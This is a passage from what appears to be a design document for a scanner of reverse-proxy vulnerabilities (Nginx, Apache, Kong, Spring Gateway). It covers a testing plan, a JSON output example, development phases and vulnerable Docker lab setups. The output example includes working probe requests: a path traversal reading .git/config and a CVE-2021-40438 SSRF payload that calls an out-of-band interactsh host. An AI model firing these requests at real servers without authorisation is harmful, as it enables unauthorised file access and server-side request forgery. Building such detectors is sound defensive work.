2. **Active Testing:**
   - Send test requests for each vulnerability
   - Use OAST (Interactsh) for out-of-band detection
   - Compare baseline vs. exploit responses

3. **Rate Limiting:**
   - Implement aggressive rate limiting for RCE checks
   - Use per-vulnerability rate limits
   - Avoid DoS conditions

4. **Reporting:**
   - Clear severity classification
   - Include CVE references
   - Provide remediation guidance
   - Show exact request/response that triggered detection

### 6.5 Output Format Example

```json
{
  "security_checks": {
    "proxy_vulnerabilities": {
      "nginx_off_by_slash": {
        "vulnerable": true,
        "severity": "medium",
        "cve": null,
        "description": "Nginx Off-by-Slash path traversal allows access to files outside intended directory",
        "evidence": {
          "request": "GET /static../.git/config",
          "response_status": 200,
          "response_body_snippet": "[core]\n\trepositoryformatversion = 0"
        },
        "remediation": "Add trailing slash to nginx alias directive"
      },
      "apache_mod_proxy_ssrf": {
        "vulnerable": true,
        "severity": "critical",
        "cve": "CVE-2021-40438",
        "description": "Apache mod_proxy SSRF vulnerability allows attacker-controlled server access",
        "evidence": {
          "request": "GET /?unix:AAA...|http://interactsh.com/",
          "oast_callback": true,
          "callback_type": "http"
        },
        "remediation": "Upgrade Apache to 2.4.49 or later"
      }
    }
  }
}
```

### 6.6 Development Phases

**Phase 1 (Week 1):**
- Implement detection infrastructure
- Add configuration file support
- Implement Priority 1 checks (CVE-2021-40438, CVE-2020-11984)

**Phase 2 (Week 2):**
- Implement Nginx checks (off-by-slash, K8s ingress)
- Implement remaining Apache checks
- Add OAST support for blind SSRF/RCE

**Phase 3 (Week 3):**
- Implement Kong and Spring Boot checks
- Implement generic proxy misconfiguration checks
- Add comprehensive test suite

**Phase 4 (Week 4):**
- Performance optimization
- Documentation
- Integration testing with real vulnerable environments

### 6.7 Testing Environments

Consider setting up test environments:
- Docker containers with vulnerable Apache/Nginx versions
- Kubernetes cluster with misconfigured ingress
- Kong Gateway with default configuration
- Spring Boot Gateway application

Example Docker setup:
```bash
# Apache 2.4.49 (CVE-2021-41773)
docker run -d -p 8080:80 httpd:2.4.49

# Nginx with off-by-slash misconfiguration
docker run -d -p 8081:80 -v $(pwd)/nginx.conf:/etc/nginx/nginx.conf nginx:1.18
```

---

## References

1. **Nuclei Templates:** https://github.com/projectdiscovery/nuclei-templates
2. **Orange Tsai's Confusion Attacks:** https://blog.orange.tw/2024/08/confusion-attacks-en.html
3. **PortSwigger Web Cache Poisoning:** https://portswigger.net/research/practical-web-cache-poisoning
4. **Apache Security Advisories:** https://httpd.apache.org/security/vulnerabilities_24.html
5. **OWASP SSRF:** https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
6. **Nginx Alias Traversal:** https://github.com/PortSwigger/nginx-alias-traversal
7. **Spring Gateway Actuator SSRF:** https://wya.pl/2021/12/20/bring-your-own-ssrf-the-gateway-actuator/

---

**Document Version:** 1.0
**Last Updated:** 2026-02-09
**Author:** Security Research Team
**Status:** Ready for Implementation
